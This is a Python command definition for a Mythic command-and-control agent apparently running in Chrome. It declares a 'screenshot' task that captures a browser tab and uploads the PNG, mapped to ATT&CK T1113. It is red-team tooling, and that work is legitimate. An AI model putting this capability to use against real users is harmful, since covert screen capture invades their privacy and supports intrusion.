from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="tab_id",
                type=ParameterType.Number,
                description="Tab to capture. Default is the visible tab.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="filename",
                type=ParameterType.String,
                description="Filename stored in Mythic",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        if self.command_line.isdigit():
            self.add_arg("tab_id", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot [tab_id]"
    description = "Capture the visible tab and upload the PNG"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    supported_ui_features = ["screenshot"]
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        tab_id = taskData.args.get_arg("tab_id")
        display = f"tab {tab_id}" if tab_id is not None else "visible tab"
        return wired_tasking(taskData, display)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
